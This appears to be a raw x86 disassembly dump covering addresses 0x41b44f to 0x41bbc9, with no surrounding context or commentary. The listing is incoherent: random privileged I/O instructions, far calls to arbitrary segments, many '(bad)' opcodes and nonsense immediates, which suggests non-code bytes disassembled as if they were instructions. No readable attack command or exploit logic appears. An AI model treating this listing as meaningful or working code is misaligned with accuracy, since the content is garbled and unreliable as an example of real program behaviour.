  41b44f:	outs   dx,BYTE PTR ds:[esi]
  41b450:	and    al,0xec
  41b452:	push   cs
  41b453:	call   0x3b6f:0x127d9914
  41b45a:	sahf   
  41b45b:	bound  esi,QWORD PTR [edi+eax*1-0x4fecb7a8]
  41b462:	inc    esi
  41b463:	dec    edi
  41b464:	out    dx,eax
  41b465:	dec    ecx
  41b466:	add    ebp,DWORD PTR [edi-0x3b076c64]
  41b46c:	pop    esi
  41b46d:	je     0x41b422
  41b46f:	pop    esi
  41b470:	cmp    eax,0xc9280188
  41b475:	adc    al,0xf5
  41b477:	hlt    
  41b478:	test   BYTE PTR [edx+esi*8+0x3a30b696],bh
  41b47f:	and    BYTE PTR [ecx-0x5b04fee7],al
  41b485:	ret    
  41b486:	pop    ds
  41b487:	pop    ds
  41b488:	into   
  41b489:	add    BYTE PTR [edx],ah
  41b48b:	add    al,BYTE PTR [eax+ebp*4]
  41b48e:	or     al,BYTE PTR [eax-0x4a]
  41b491:	mov    edx,0x36b7c71c
  41b496:	or     al,0xf5
  41b498:	dec    esi
  41b499:	cmp    BYTE PTR [ecx-0x1b],0x75
  41b49d:	add    al,0xe
  41b49f:	test   DWORD PTR [eax],esp
  41b4a1:	jl     0x41b48c
  41b4a3:	pop    es
  41b4a4:	out    dx,eax
  41b4a5:	cmp    esi,DWORD PTR [edx]
  41b4a7:	repz dec ebp
  41b4a9:	popa   
  41b4aa:	enter  0x1fa5,0x8a
  41b4ae:	mov    ebx,0x50378aba
  41b4b3:	or     DWORD PTR [edi],ebx
  41b4b5:	jp     0x41b49d
  41b4b7:	adc    al,bh
  41b4b9:	mov    ds:0xd73a0e48,al
  41b4be:	dec    bh
  41b4c0:	dec    edi
  41b4c1:	sbb    dh,BYTE PTR [ebp-0x24]
  41b4c4:	cli    
  41b4c5:	pop    ebx
  41b4c6:	fsub   st(1),st
  41b4c8:	test   eax,0xeaf0ae5
  41b4cd:	jle    0x41b4a5
  41b4cf:	out    0x90,eax
  41b4d1:	ret    0xdc6f
  41b4d4:	mov    esi,0x3db17
  41b4d9:	mov    eax,0xdbde66c4
  41b4de:	mov    DWORD PTR [esi],edi
  41b4e0:	fwait
  41b4e1:	leave  
  41b4e2:	pop    ss
  41b4e3:	fdiv   DWORD PTR [edx+0xbe4bb98]
  41b4e9:	or     eax,0x77f481c9
  41b4ee:	jp     0x41b4f2
  41b4f0:	pop    es
  41b4f1:	cmp    al,0x1
  41b4f3:	add    BYTE PTR [edx-0x2a0a060d],cl
  41b4f9:	hlt    
  41b4fa:	push   ds
  41b4fb:	add    BYTE PTR [ebx],bl
  41b4fd:	std    
  41b4fe:	sbb    eax,0x874eca8c
  41b503:	sti    
  41b504:	loope  0x41b558
  41b506:	dec    ebp
  41b507:	das    
  41b508:	loopne 0x41b4b1
  41b50a:	(bad)  
  41b50b:	(bad)  
  41b50c:	jno    0x41b4a6
  41b50e:	mov    dh,0xde
  41b510:	push   eax
  41b511:	iret   
  41b512:	mov    bl,0xeb
  41b514:	ds test al,0xb0
  41b517:	sub    dh,ah
  41b519:	outs   dx,DWORD PTR ds:[esi]
  41b51a:	push   eax
  41b51b:	pop    esi
  41b51c:	jg     0x41b594
  41b51e:	pop    ss
  41b51f:	int    0x74
  41b521:	popa   
  41b522:	xchg   edi,eax
  41b523:	and    cl,dl
  41b525:	or     DWORD PTR [ebp-0x2338db0b],edx
  41b52b:	xchg   esp,eax
  41b52c:	rcl    BYTE PTR [ecx+0x47],cl
  41b52f:	in     eax,0x90
  41b531:	adc    BYTE PTR [ebp-0x6c],0xe1
  41b535:	sub    eax,0x7fd4fe4c
  41b53a:	int3   
  41b53b:	mov    BYTE PTR [ecx],dl
  41b53d:	data16 loop 0x41b4c2
  41b540:	mov    al,0x49
  41b542:	std    
  41b543:	in     eax,0x40
  41b545:	fild   QWORD PTR [esi+0x4d29b7f0]
  41b54b:	pop    ebp
  41b54c:	aam    0xe8
  41b54e:	bound  ebp,QWORD PTR [esi+0x4b83ff7]
  41b554:	lock aad 0xdd
  41b557:	cmp    eax,0xa5fb1273
  41b55c:	sbb    BYTE PTR [ebp+0x3],0xeb
  41b560:	mov    edx,0xfc54d653
  41b565:	inc    ecx
  41b566:	mov    WORD PTR [edi],es
  41b568:	push   cs
  41b569:	mov    bl,0x58
  41b56b:	pop    es
  41b56c:	ss mov dh,0x9b
  41b56f:	frstor [ecx-0x3ae45397]
  41b575:	pop    esi
  41b576:	xchg   DWORD PTR [ebx],esi
  41b578:	jp     0x41b56c
  41b57a:	dec    edi
  41b57b:	mov    ds:0x4702a008,al
  41b580:	xchg   ecx,eax
  41b581:	cmp    DWORD PTR [esp+esi*1-0x7f],0xffffff9e
  41b586:	push   esp
  41b587:	cmpps  xmm7,XMMWORD PTR [ebx+0x62],0x58
  41b58c:	fld    DWORD PTR [eax-0x1b274627]
  41b592:	xchg   ecx,eax
  41b593:	sar    dh,0xff
  41b596:	add    DWORD PTR [ebp-0x57],edi
  41b599:	or     DWORD PTR [edi],ebp
  41b59b:	fidivr WORD PTR [esi+0x3c65a624]
  41b5a1:	dec    ebx
  41b5a2:	and    BYTE PTR [edi+0x7c],al
  41b5a5:	jno    0x41b58f
  41b5a7:	enter  0xa5d4,0xc3
  41b5ab:	adc    dl,BYTE PTR [ecx-0x1a6a8810]
  41b5b1:	lock and al,0x2e
  41b5b4:	stos   BYTE PTR es:[edi],al
  41b5b5:	cs mov esi,0x7a9572a8
  41b5bb:	in     eax,dx
  41b5bc:	mov    dl,0x5c
  41b5be:	xchg   ecx,eax
  41b5bf:	frstor [edi+eax*2+0x42fc8fd3]
  41b5c6:	scas   al,BYTE PTR es:[edi]
  41b5c7:	xor    ah,BYTE PTR [eax+0x58f05621]
  41b5cd:	imul   esi,edi,0xf304761d
  41b5d3:	or     eax,0xf8ad404b
  41b5d8:	ret    0x946e
  41b5db:	loope  0x41b5bf
  41b5dd:	iret   
  41b5de:	loope  0x41b57a
  41b5e0:	lahf   
  41b5e1:	cmp    edx,DWORD PTR [esi+0x158528e3]
  41b5e7:	aad    0x7e
  41b5e9:	mov    bl,0x3e
  41b5eb:	jo     0x41b630
  41b5ed:	arpl   ax,cx
  41b5ef:	xchg   edx,eax
  41b5f0:	sahf   
  41b5f1:	push   es
  41b5f2:	dec    esp
  41b5f3:	pop    eax
  41b5f4:	js     0x41b646
  41b5f6:	xchg   BYTE PTR [edx],al
  41b5f8:	mov    ebx,0x71ac2094
  41b5fd:	inc    ebx
  41b5fe:	data16 lods al,BYTE PTR ds:[esi]
  41b600:	setno  cl
  41b603:	rol    BYTE PTR [edx+ebx*2],cl
  41b606:	inc    eax
  41b607:	sub    cl,BYTE PTR [ebx]
  41b609:	pop    ecx
  41b60a:	mov    ds:0x1642c22f,eax
  41b60f:	in     eax,dx
  41b610:	mov    cl,0x75
  41b612:	push   ebp
  41b613:	push   ebx
  41b614:	or     bl,BYTE PTR [edi+0x27017ffb]
  41b61a:	xchg   cl,ah
  41b61c:	pushf  
  41b61d:	int    0x1
  41b61f:	ja     0x41b667
  41b621:	(bad)  
  41b622:	out    0x25,al
  41b624:	push   0x2fd307e5
  41b629:	adc    BYTE PTR [edi-0x55],0x4c
  41b62d:	int    0x8d
  41b62f:	je     0x41b61a
  41b631:	loopne 0x41b651
  41b633:	mov    bh,0xc1
  41b635:	sub    eax,0xbd4e103a
  41b63a:	mov    eax,ds:0xafa8a706
  41b63f:	sahf   
  41b640:	jle    0x41b60d
  41b642:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b644:	repz pop edi
  41b646:	je     0x41b5d7
  41b648:	xor    ch,ah
  41b64a:	cmp    DWORD PTR [edi+esi*1-0x43e70f78],esp
  41b651:	mov    esi,0xbd8a85db
  41b656:	nop
  41b657:	and    eax,0x4a2aeea
  41b65c:	ret    
  41b65d:	out    0xe6,al
  41b65f:	in     al,dx
  41b660:	or     bl,BYTE PTR [esi+0x6f751611]
  41b666:	pushf  
  41b667:	jg     0x41b620
  41b669:	and    ch,dh
  41b66b:	mov    ds:0x5bc4a553,al
  41b670:	xchg   esi,eax
  41b671:	xchg   esp,eax
  41b672:	jo     0x41b64b
  41b674:	mov    dh,0x36
  41b676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b677:	loop   0x41b6f0
  41b679:	popa   
  41b67a:	xor    ch,BYTE PTR es:[esp+ecx*2+0x22]
  41b67f:	into   
  41b680:	dec    eax
  41b681:	cld    
  41b682:	ins    DWORD PTR es:[edi],dx
  41b683:	mov    ecx,0x7108ce7d
  41b688:	mov    eax,ds:0xa7ae2f74
  41b68d:	ret    0xe046
  41b690:	in     eax,0x25
  41b692:	fisub  WORD PTR [edi]
  41b694:	ds inc esp
  41b696:	push   0xb
  41b698:	and    eax,0x80dbbbbe
  41b69d:	(bad)  
  41b69e:	adc    al,0xbe
  41b6a0:	cmc    
  41b6a1:	in     eax,0x81
  41b6a3:	inc    esp
  41b6a4:	push   0x502eb735
  41b6a9:	out    dx,eax
  41b6aa:	cmp    edx,esp
  41b6ac:	stc    
  41b6ad:	leave  
  41b6ae:	adc    eax,0x380b09b8
  41b6b3:	out    0x1b,eax
  41b6b5:	jbe    0x41b6e4
  41b6b7:	in     eax,0x4b
  41b6b9:	stos   BYTE PTR es:[edi],al
  41b6ba:	push   eax
  41b6bb:	mov    ch,0x16
  41b6bd:	cld    
  41b6be:	stos   DWORD PTR es:[edi],eax
  41b6bf:	xor    al,0x22
  41b6c1:	fwait
  41b6c2:	cmp    al,0x54
  41b6c4:	jg     0x41b699
  41b6c6:	popf   
  41b6c7:	mov    eax,0xd28b5848
  41b6cc:	scas   al,BYTE PTR es:[edi]
  41b6cd:	add    BYTE PTR [edx],bl
  41b6cf:	rol    BYTE PTR [edx+edi*1],0xeb
  41b6d3:	scas   al,BYTE PTR es:[edi]
  41b6d4:	push   ecx
  41b6d5:	loopne 0x41b6a0
  41b6d7:	dec    edx
  41b6d9:	aam    0x91
  41b6db:	cli    
  41b6dc:	ss inc ecx
  41b6de:	and    DWORD PTR [edi+0x804dfe3],edi
  41b6e4:	sub    esp,DWORD PTR [ebx]
  41b6e6:	popf   
  41b6e7:	push   ds
  41b6e8:	mov    edx,0xf8382232
  41b6ed:	ja     0x41b6c2
  41b6ef:	push   ebx
  41b6f0:	stos   DWORD PTR es:[edi],eax
  41b6f1:	test   BYTE PTR [esi],cl
  41b6f3:	sub    eax,0x738673dd
  41b6f8:	mov    bh,0x13
  41b6fa:	inc    ebx
  41b6fb:	and    DWORD PTR [ebx+0x71],edi
  41b6fe:	push   edi
  41b6ff:	xor    eax,0xe8de7a3a
  41b704:	or     cl,bh
  41b706:	nop
  41b707:	push   edx
  41b708:	lds    edx,FWORD PTR [ecx+0x49c46ece]
  41b70e:	in     al,0x98
  41b710:	inc    edi
  41b711:	jbe    0x41b6c4
  41b713:	loop   0x41b720
  41b715:	xor    DWORD PTR [edi],edx
  41b717:	iret   
  41b718:	lds    esp,FWORD PTR [esi+0x292601a9]
  41b71e:	jb     0x41b765
  41b720:	icebp  
  41b721:	jne    0x41b76f
  41b723:	rol    DWORD PTR [ebp+0x611da91b],1
  41b729:	xor    eax,DWORD PTR [ebx+0x15]
  41b72c:	ror    DWORD PTR [ebx+0x14],1
  41b72f:	fadd   st,st(6)
  41b731:	adc    DWORD PTR [ebp-0x1c30a12c],0xe2956ecd
  41b73b:	sub    BYTE PTR [edx],cl
  41b73d:	iret   
  41b73e:	mov    eax,ds:0xa3e10cb0
  41b743:	or     BYTE PTR [edx+ebp*1-0x7b],cl
  41b747:	dec    ecx
  41b748:	ret    0x454e
  41b74b:	dec    edx
  41b74c:	adc    esi,DWORD PTR [eax+edi*1-0x23]
  41b750:	cmp    eax,0xb39d9652
  41b755:	xor    al,0x57
  41b757:	pop    eax
  41b758:	retf   
  41b759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b75a:	loope  0x41b703
  41b75c:	popf   
  41b75d:	scas   al,BYTE PTR es:[edi]
  41b75e:	xchg   esp,eax
  41b75f:	xchg   edx,eax
  41b760:	sbb    al,0xfb
  41b762:	mov    edi,0x585288a5
  41b767:	xchg   esp,eax
  41b768:	pop    edx
  41b769:	pop    ds
  41b76a:	push   ecx
  41b76b:	aaa    
  41b76c:	lods   eax,DWORD PTR ds:[esi]
  41b76d:	cmp    BYTE PTR [ebx],al
  41b76f:	out    dx,eax
  41b770:	jg     0x41b701
  41b772:	stos   BYTE PTR es:[edi],al
  41b773:	les    edi,FWORD PTR [esi-0x6dbfb0bb]
  41b779:	movups xmm5,XMMWORD PTR [esi+ebp*1]
  41b77d:	fadd   QWORD PTR [ebp+0x3d338832]
  41b783:	scas   al,BYTE PTR es:[edi]
  41b784:	adc    ah,ah
  41b786:	mul    BYTE PTR [esi-0x4e]
  41b789:	pop    edx
  41b78a:	mov    al,0x7a
  41b78c:	retf   
  41b78d:	aas    
  41b78e:	repnz and BYTE PTR [ecx+0x3f4af261],bl
  41b795:	mov    ds:0xddc385ae,eax
  41b79a:	shl    dl,1
  41b79c:	rol    DWORD PTR [edi],0x54
  41b79f:	pop    esi
  41b7a0:	xor    eax,0x946912e1
  41b7a5:	or     BYTE PTR [edx+esi*8-0xb],bh
  41b7a9:	aaa    
  41b7aa:	hlt    
  41b7ab:	xchg   ebx,eax
  41b7ac:	inc    eax
  41b7ad:	loope  0x41b7f8
  41b7af:	ret    
  41b7b0:	pop    ds
  41b7b1:	ss icebp 
  41b7b3:	and    esp,DWORD PTR [ebp+0xe1f3461]
  41b7b9:	push   esi
  41b7ba:	call   0xeb9dd265
  41b7bf:	pop    ecx
  41b7c0:	dec    ecx
  41b7c1:	sbb    eax,0xc474a708
  41b7c6:	into   
  41b7c7:	shl    DWORD PTR [edi+0x351c19f2],0x6c
  41b7ce:	out    dx,eax
  41b7cf:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x771836b9]
  41b7d7:	xchg   BYTE PTR [eax-0x41],cl
  41b7da:	pusha  
  41b7db:	inc    esp
  41b7dc:	loop   0x41b7bf
  41b7de:	fwait
  41b7df:	icebp  
  41b7e0:	sub    eax,0xdc61e754
  41b7e5:	iret   
  41b7e6:	shr    DWORD PTR [edi+eiz*2],cl
  41b7e9:	ss ror dl,cl
  41b7ec:	mov    bh,0x49
  41b7ee:	adc    edi,DWORD PTR [edi]
  41b7f0:	cld    
  41b7f1:	adc    bh,BYTE PTR [edi+0x378cf3d9]
  41b7f7:	iret   
  41b7f8:	push   0xa89a4dc5
  41b7fd:	aas    
  41b7fe:	mov    edi,0x300a0dbf
  41b803:	pusha  
  41b804:	popf   
  41b805:	push   ss
  41b806:	mov    ah,0x42
  41b808:	mov    eax,ds:0x8d05e4e6
  41b80d:	mov    es,WORD PTR [esi-0x11]
  41b810:	inc    esi
  41b811:	push   ebx
  41b812:	mov    ebp,0x70c15063
  41b817:	test   eax,0xacdb5e2
  41b81c:	scas   al,BYTE PTR es:[edi]
  41b81d:	call   0x5cf1:0xd29512cf
  41b824:	stos   DWORD PTR es:[edi],eax
  41b825:	imul   ebx,DWORD PTR ds:0xca3c517f,0x22f1828a
  41b82f:	pop    edi
  41b830:	inc    edi
  41b831:	inc    esi
  41b832:	dec    edx
  41b833:	pop    ecx
  41b834:	in     eax,dx
  41b835:	xor    al,0x70
  41b837:	or     eax,0xe02f38ba
  41b83c:	pop    ecx
  41b83d:	scas   eax,DWORD PTR es:[edi]
  41b83e:	rcl    DWORD PTR [eax-0x60],cl
  41b841:	(bad)  
  41b844:	scas   eax,DWORD PTR es:[edi]
  41b845:	sti    
  41b846:	repnz sbb DWORD PTR [edx-0x30bcf52a],0xba7d1bc0
  41b851:	inc    esi
  41b852:	sahf   
  41b853:	inc    eax
  41b854:	lods   al,BYTE PTR ds:[esi]
  41b855:	cs and al,0x81
  41b858:	repz jbe 0x41b8c5
  41b85b:	enter  0x8a2c,0x68
  41b85f:	and    al,BYTE PTR [edi+0x7cb816f5]
  41b865:	add    al,0xf3
  41b867:	test   ebp,edi
  41b869:	or     BYTE PTR [ebp+0x71],ah
  41b86c:	out    dx,al
  41b86d:	xchg   BYTE PTR [edi+edi*2],dh
  41b870:	loop   0x41b852
  41b872:	iret   
  41b873:	test   BYTE PTR [edx-0x1d3ed047],dh
  41b879:	call   ebx
  41b87b:	inc    edi
  41b87c:	scas   eax,DWORD PTR es:[edi]
  41b87d:	add    eax,0xbc762fad
  41b882:	(bad)  
  41b883:	repz dec ebx
  41b885:	aad    0x7a
  41b887:	mov    BYTE PTR [esi-0x6204edcb],al
  41b88d:	inc    ecx
  41b88e:	push   es
  41b88f:	cmc    
  41b890:	mov    ds:0x829fd2b7,eax
  41b895:	sbb    ch,BYTE PTR [edx]
  41b897:	cmp    ebp,DWORD PTR [eax+0x6aed29c]
  41b89d:	repnz push esi
  41b89f:	aam    0x91
  41b8a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a2:	pop    ss
  41b8a3:	imul   esp,DWORD PTR [ecx-0x18],0xffffff87
  41b8a7:	inc    ecx
  41b8a8:	mov    ebx,0x573795e3
  41b8ad:	fnstsw WORD PTR [eax]
  41b8af:	sub    DWORD PTR [eax+0x79dd9c23],esp
  41b8b5:	jne    0x41b92b
  41b8b7:	test   DWORD PTR [eax],edi
  41b8b9:	mov    ecx,0x38dd5c5b
  41b8be:	cli    
  41b8bf:	outs   dx,BYTE PTR ds:[esi]
  41b8c0:	xchg   DWORD PTR [eax+0x7a],ebx
  41b8c3:	inc    ecx
  41b8c4:	loopne 0x41b902
  41b8c6:	rcr    BYTE PTR [ebx+0x6ca47628],0x35
  41b8cd:	and    al,0x2d
  41b8cf:	int    0x4a
  41b8d1:	adc    al,0x33
  41b8d3:	mov    ds:0x7ba42e2b,eax
  41b8d8:	adc    eax,0x658b1152
  41b8dd:	mov    ecx,0x2b2a9935
  41b8e2:	test   eax,0x5f8c201c
  41b8e7:	push   esi
  41b8e8:	lods   al,BYTE PTR ds:[esi]
  41b8e9:	outs   dx,DWORD PTR ds:[esi]
  41b8ea:	cmp    ebp,esi
  41b8ec:	std    
  41b8ed:	or     eax,0x4e0fae23
  41b8f2:	dec    eax
  41b8f3:	inc    esi
  41b8f4:	(bad)  
  41b8f5:	into   
  41b8f6:	or     DWORD PTR ds:0xf529db21,esi
  41b8fc:	mov    ds:0x5492d47,eax
  41b901:	inc    edx
  41b902:	es int 0x32
  41b905:	pushf  
  41b906:	xchg   edi,eax
  41b907:	in     eax,dx
  41b908:	mov    DWORD PTR [esi-0x4f],edi
  41b90b:	fnstsw WORD PTR [ecx]
  41b90d:	and    BYTE PTR [ecx],bh
  41b90f:	pop    ds
  41b910:	es xchg ebp,eax
  41b912:	popa   
  41b913:	cli    
  41b914:	mov    ch,0x22
  41b916:	xchg   ebp,eax
  41b917:	push   eax
  41b918:	out    dx,eax
  41b919:	and    DWORD PTR [ebx+esi*8+0x7e],edi
  41b91d:	sbb    BYTE PTR [esi+0x58],al
  41b920:	int3   
  41b921:	bound  eax,QWORD PTR [eax+0x50]
  41b924:	xchg   ebx,eax
  41b925:	aad    0xce
  41b927:	and    eax,0x795f7b5
  41b92c:	pop    esi
  41b92d:	lods   al,BYTE PTR ds:[esi]
  41b92e:	jno    0x41b8b4
  41b930:	adc    edx,DWORD PTR [eax-0x26]
  41b933:	outs   dx,BYTE PTR ds:[esi]
  41b934:	gs xchg edx,eax
  41b936:	sbb    al,0x23
  41b938:	sub    BYTE PTR [ebp+0x66],bh
  41b93b:	stc    
  41b93c:	loopne 0x41b8ff
  41b93e:	std    
  41b93f:	add    eax,0xedd19083
  41b944:	addr16 xor al,0x21
  41b947:	mov    ebx,0xfc8e9df3
  41b94c:	hlt    
  41b94d:	xor    dl,BYTE PTR [edi+0x1d]
  41b950:	ins    BYTE PTR es:[edi],dx
  41b951:	mov    bh,0xf7
  41b953:	(bad)  [ebx-0x139f68ae]
  41b959:	cld    
  41b95a:	jb     0x41b96b
  41b95c:	fisttp DWORD PTR [ebx-0x70]
  41b95f:	add    BYTE PTR [ebp-0x4b519ba7],0xab
  41b966:	sbb    al,0x85
  41b968:	jne    0x41b8f5
  41b96a:	push   edi
  41b96b:	xor    DWORD PTR [edi+0x6bd768fa],ebp
  41b971:	retf   0xd53b
  41b974:	jne    0x41b9d8
  41b976:	mov    dl,0x12
  41b978:	ret    
  41b979:	fnsave [eax]
  41b97b:	stc    
  41b97c:	mov    edx,0x8216ff85
  41b981:	cmp    edi,DWORD PTR [edi+ecx*1]
  41b984:	std    
  41b985:	out    0x3b,al
  41b987:	loopne 0x41b9e0
  41b989:	mov    BYTE PTR [eax],bl
  41b98b:	mov    esi,0xe3833785
  41b990:	call   0x52c3:0xe221f3a9
  41b997:	lods   al,BYTE PTR ds:[esi]
  41b998:	popf   
  41b999:	jg     0x41b96b
  41b99b:	push   esi
  41b99c:	js     0x41b9ec
  41b99e:	push   0xf20f036f
  41b9a3:	int    0x3f
  41b9a5:	mov    cl,BYTE PTR [eax]
  41b9a7:	or     edi,DWORD PTR [ebx+ebp*2-0x2]
  41b9ab:	cmp    eax,ecx
  41b9ad:	mov    dl,0x79
  41b9af:	mov    BYTE PTR [esi-0x58c0f5aa],al
  41b9b5:	sub    al,0x54
  41b9b7:	leave  
  41b9b8:	push   ds
  41b9b9:	jns    0x41b9b9
  41b9bb:	push   edx
  41b9bc:	int3   
  41b9bd:	rcr    ecx,0xe
  41b9c0:	cld    
  41b9c1:	int3   
  41b9c2:	popa   
  41b9c3:	push   es
  41b9c4:	pop    ecx
  41b9c5:	rcl    BYTE PTR es:[eax+0x6f304649],1
  41b9cc:	jno    0x41b990
  41b9ce:	adc    BYTE PTR ds:0xf78d85cd,0x82
  41b9d5:	mov    ch,BYTE PTR [esi+0x14]
  41b9d8:	mov    ds:0x88357a66,eax
  41b9dd:	cmc    
  41b9de:	add    esp,DWORD PTR [ecx-0x7a3f4f9]
  41b9e4:	inc    esi
  41b9e5:	lea    edi,[edx-0x1910135e]
  41b9eb:	jmp    0x41b9c4
  41b9ed:	test   al,0x4f
  41b9f0:	add    edi,DWORD PTR ds:0x48e56ebb
  41b9f6:	push   0xffffffb0
  41b9f8:	xchg   ecx,edi
  41b9fa:	stos   DWORD PTR es:[edi],eax
  41b9fb:	and    edx,esi
  41b9fd:	out    dx,al
  41b9fe:	lahf   
  41b9ff:	in     eax,0xcb
  41ba01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba02:	(bad)  
  41ba03:	das    
  41ba04:	mov    edi,0x4b8e1ce4
  41ba09:	fidiv  WORD PTR [edi+0x4b]
  41ba0c:	(bad)  
  41ba0d:	cli    
  41ba0e:	jp     0x41b9eb
  41ba10:	dec    ebp
  41ba11:	and    cl,dh
  41ba13:	in     al,dx
  41ba14:	mov    al,0xf
  41ba16:	cmp    al,0x2d
  41ba18:	jmp    0xfb7c:0xa695e65d
  41ba1f:	sbb    edx,DWORD PTR [edi+esi*8]
  41ba22:	test   BYTE PTR [esi+0x63],0x6f
  41ba26:	dec    esi
  41ba27:	xor    ch,bl
  41ba29:	fptan  
  41ba2b:	mov    al,0x20
  41ba2d:	pop    ebp
  41ba2e:	cmp    BYTE PTR [ebx+0x34112154],dl
  41ba34:	push   esp
  41ba35:	inc    esp
  41ba36:	(bad)  
  41ba37:	stc    
  41ba38:	push   ss
  41ba39:	rcr    BYTE PTR [edx],0x1
  41ba3c:	in     al,dx
  41ba3d:	ins    DWORD PTR es:[edi],dx
  41ba3e:	push   ecx
  41ba3f:	inc    esi
  41ba40:	inc    esi
  41ba41:	mov    edx,0x89ac74da
  41ba46:	ret    0x6941
  41ba49:	jmp    0x41ba86
  41ba4b:	adc    DWORD PTR [ebx],0x10
  41ba4e:	and    esp,eax
  41ba50:	in     al,0xd8
  41ba52:	ds leave 
  41ba54:	dec    edx
  41ba55:	pop    edi
  41ba56:	aaa    
  41ba57:	fst    DWORD PTR [ebx-0x3e423d37]
  41ba5d:	sub    eax,0x9775f575
  41ba62:	push   ebp
  41ba63:	ins    DWORD PTR es:[edi],dx
  41ba64:	aaa    
  41ba65:	in     eax,0x52
  41ba67:	nop
  41ba68:	test   BYTE PTR [ecx-0x66afd00f],dl
  41ba6e:	pop    edx
  41ba6f:	cld    
  41ba70:	mul    BYTE PTR [ebx]
  41ba72:	ret    0x61b3
  41ba75:	(bad)  
  41ba76:	dec    ebp
  41ba77:	pop    ecx
  41ba78:	(bad)  
  41ba79:	iret   
  41ba7a:	repnz pop ax
  41ba7d:	inc    edi
  41ba7e:	jmp    0x41ba96
  41ba80:	mov    ebp,0x92ed767a
  41ba85:	pop    ss
  41ba86:	aaa    
  41ba87:	(bad)  
  41ba88:	sti    
  41ba89:	lahf   
  41ba8a:	push   ebx
  41ba8b:	call   0xcf44:0x4a6c11d
  41ba92:	and    al,0xaa
  41ba94:	div    DWORD PTR [eax+0x62]
  41ba97:	ds pop ecx
  41ba99:	inc    edi
  41ba9a:	mov    dh,0x3b
  41ba9c:	sbb    al,bl
  41ba9e:	lds    esi,FWORD PTR [edi-0x72]
  41baa1:	or     DWORD PTR [ebp+0x35ab4443],ebx
  41baa7:	xor    eax,0x1e78e11d
  41baac:	ret    
  41baad:	ds jge 0x41ba4e
  41bab0:	shl    BYTE PTR [eax+0x22d2f631],cl
  41bab6:	(bad)
  41baba:	push   esp
  41babb:	xor    eax,0x16170454
  41bac0:	cs sbb edi,ecx
  41bac3:	inc    eax
  41bac4:	push   ss
  41bac5:	push   ss
  41bac6:	cs call 0x93a0:0x6a10d88c
  41bace:	aas    
  41bacf:	lahf   
  41bad0:	repz dec ecx
  41bad2:	xchg   ebp,eax
  41bad3:	sub    BYTE PTR [edx+0x11e43f31],0xa7
  41bada:	pop    ecx
  41badb:	mov    eax,DWORD PTR [edx-0xcef043e]
  41bae1:	mov    al,0x53
  41bae3:	jns    0x41bb11
  41bae5:	adc    BYTE PTR [eax-0x1d],ah
  41bae8:	jmp    0x2531:0x9e67e547
  41baef:	(bad)  [eax+edx*1]
  41baf2:	pop    ebp
  41baf3:	dec    esp
  41baf4:	mov    dl,0xcd
  41baf6:	xor    al,0x2d
  41baf8:	jb     0x41ba81
  41bafa:	dec    eax
  41bafb:	outs   dx,DWORD PTR ds:[esi]
  41bafc:	xchg   esp,eax
  41bafd:	pop    ds
  41bafe:	add    BYTE PTR [edx+0x64],ah
  41bb01:	cmp    eax,0x2b2c6686
  41bb06:	pushf  
  41bb07:	jns    0x41bb87
  41bb09:	iret   
  41bb0a:	sub    BYTE PTR [esi-0x48abb7e7],bh
  41bb10:	xor    bh,BYTE PTR [ecx+0x2010c184]
  41bb16:	dec    esi
  41bb17:	sub    edx,eax
  41bb19:	mov    ds,WORD PTR [esi+0x24]
  41bb1c:	cmp    ecx,edi
  41bb1e:	xor    eax,0x79a60d02
  41bb23:	pop    ebx
  41bb24:	ins    DWORD PTR es:[edi],dx
  41bb25:	loop   0x41bafb
  41bb27:	sar    ecx,0x35
  41bb2a:	adc    eax,0x1a4dface
  41bb2f:	mov    cl,0x9
  41bb31:	xchg   DWORD PTR [esi+edx*1],edx
  41bb34:	int    0x38
  41bb36:	dec    ebx
  41bb37:	lods   al,BYTE PTR ds:[esi]
  41bb38:	cs test edx,edi
  41bb3b:	(bad)  
  41bb3c:	in     al,0xce
  41bb3e:	loope  0x41bb8d
  41bb40:	ficomp DWORD PTR [edi]
  41bb42:	rcl    BYTE PTR [eax-0x64fb22d4],cl
  41bb48:	jb     0x41baec
  41bb4a:	add    eax,0x8761a861
  41bb4f:	fwait
  41bb50:	jmp    0x41bb60
  41bb52:	cs test eax,0xaf3a5d48
  41bb58:	push   esp
  41bb59:	outs   dx,DWORD PTR ds:[esi]
  41bb5a:	ds icebp 
  41bb5c:	les    esp,FWORD PTR [eax]
  41bb5e:	xor    eax,0x78973f2a
  41bb63:	dec    esp
  41bb64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb65:	sub    DWORD PTR [edx],eax
  41bb67:	add    dl,bl
  41bb69:	cld    
  41bb6a:	les    edx,FWORD PTR [eax]
  41bb6c:	push   esi
  41bb6d:	adc    bl,BYTE PTR [eax]
  41bb6f:	pop    ebp
  41bb70:	mov    dl,0xee
  41bb72:	push   edx
  41bb73:	jle    0x41bb76
  41bb75:	vmwrite ecx,DWORD PTR [esi]
  41bb78:	dec    ecx
  41bb79:	pop    ecx
  41bb7a:	stos   DWORD PTR es:[edi],eax
  41bb7b:	dec    eax
  41bb7c:	shl    BYTE PTR [edx-0x6fd2f5b6],0x63
  41bb83:	push   eax
  41bb84:	out    0xef,al
  41bb86:	rcl    DWORD PTR [esi+eax*8-0x38],cl
  41bb8a:	sbb    DWORD PTR [esi],0x4ff9266
  41bb90:	rcr    BYTE PTR [ecx-0x2515c02e],cl
  41bb96:	or     al,0x48
  41bb98:	mov    edi,0xe19fd040
  41bb9d:	je     0x41bbb2
  41bb9f:	mov    edi,0xba6537c9
  41bba4:	mov    ah,0x48
  41bba6:	cdq    
  41bba7:	xchg   ecx,eax
  41bba8:	mov    esp,ecx
  41bbaa:	daa    
  41bbab:	xlat   BYTE PTR ds:[ebx]
  41bbac:	fwait
  41bbad:	cmp    BYTE PTR [edi],0x3b
  41bbb0:	add    esp,esi
  41bbb2:	sbb    DWORD PTR [ebp-0x147f37cb],esp
  41bbb8:	shl    BYTE PTR [edx-0x6ef37515],cl
  41bbbe:	neg    BYTE PTR [ebp-0x80]
  41bbc1:	xor    ecx,DWORD PTR [eax+ebx*4]
  41bbc4:	inc    ecx
  41bbc5:	in     eax,dx
  41bbc6:	std    
  41bbc7:	loopne 0x41bbf0
  41bbc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
